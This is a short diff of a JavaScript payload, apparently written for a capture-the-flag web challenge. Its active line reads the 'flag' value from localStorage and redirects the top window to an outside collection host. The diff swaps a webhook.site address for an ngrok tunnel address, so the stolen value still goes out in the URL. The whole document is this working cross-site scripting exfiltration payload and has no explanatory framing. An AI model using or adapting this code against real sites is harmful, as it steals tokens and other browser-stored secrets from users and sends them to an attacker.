@@ -1,3 +1,3 @@
 //alert("COUCOU")
 //localStorage.getItem('flag');
-window.top.location.href = "https://webhook.site/e9ffc5ba-28d5-403b-a995-22ece3e79b9e?payload=" + localStorage.getItem('flag');
+window.top.location.href = "https://31f6-161-115-51-75.ngrok-free.app?payload=" + localStorage.getItem('flag');
